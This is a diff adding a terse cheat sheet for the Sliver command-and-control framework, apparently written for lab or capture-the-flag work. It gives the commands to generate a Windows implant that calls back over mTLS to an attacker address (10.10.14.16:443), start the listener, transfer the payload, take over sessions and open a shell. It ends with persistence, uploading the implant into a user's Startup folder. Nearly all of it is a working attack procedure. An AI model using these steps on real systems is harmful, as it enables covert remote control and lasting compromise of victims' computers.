@@ -1,0 +1,53 @@
+Install SLIVER C2 Server:
+
+$ sudo apt install sliver
+
+Start the server...
+
+1. start sliver server:--->
+
+ 1. $ sliver-server
+  
+ 2. sliver> jobs
+ 
+ 3. sliver> generate --mtls <attaker IP> --save <output file file.exe> --os Windows
+ 
+     OR
+     
+     generate --mtls 10.10.14.16:443 --os Windows --arch 64 
+     
+ 
+ 4. sliver> mtls
+ 
+ 5. sliver> jobs
+ 
+ Transfer payload to target ....
+ 
+ 6. sliver> sessions  (for check sessions)
+ 
+ 7. sliver> sessions -i (Session ID Name)
+ 
+ 8. sliver> help
+ 
+ 9. sliver (SILLY_LINE) > whoami
+ 
+ 10. sliver (SILLY_LINE) > info
+ 
+ 11. sliver (SILLY_LINE) > shell
+ 
+ 
+ PERSISTENT USING STARTUP FOLDER:--->
+ --------------------------------
+ 
+ startup folder location:--->
+
+C:\Users\sam\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+upload using SLIVER C2 Server:-->
+
+
+> upload -i /home/sam/sam.exe 'C:\Users\sam\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sam.exe'
+
+
+
+
